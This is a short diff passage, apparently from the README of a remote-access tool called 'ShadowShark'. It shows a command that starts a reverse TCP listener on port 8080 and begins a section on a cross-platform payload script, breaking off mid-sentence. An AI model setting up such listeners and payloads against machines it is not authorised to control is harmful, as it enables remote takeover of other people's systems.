@@ -78,3 +78,5 @@ $ python3 ShadowSharkListener.py --lhost 0.0.0.0 --lport 8080
     
 [*] A reverse TCP handler on 0.0.0.0:8080 has successfully started...
 ```
+### ShadowSharkPayload.py
+This payload can run on any operating system. To configure the payload go to line
